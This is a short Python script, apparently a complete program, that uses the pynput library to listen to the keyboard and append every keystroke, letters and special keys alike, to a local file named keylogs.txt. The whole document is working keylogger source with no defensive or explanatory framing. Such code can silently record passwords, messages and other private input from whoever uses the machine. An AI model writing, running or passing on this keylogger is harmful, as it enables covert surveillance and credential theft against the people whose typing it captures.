import os
from pynput import keyboard

def on_key_press(key):
    with open('keylogs.txt', 'a') as f:
        try: 
            f.write(key.char)  # for letters and numbers
        except AttributeError: 
            f.write(str(key))  # for special keys (e.g., shift, enter etc.)
    return True

with keyboard.Listener(on_press=on_key_press) as listener:
    listener.join()
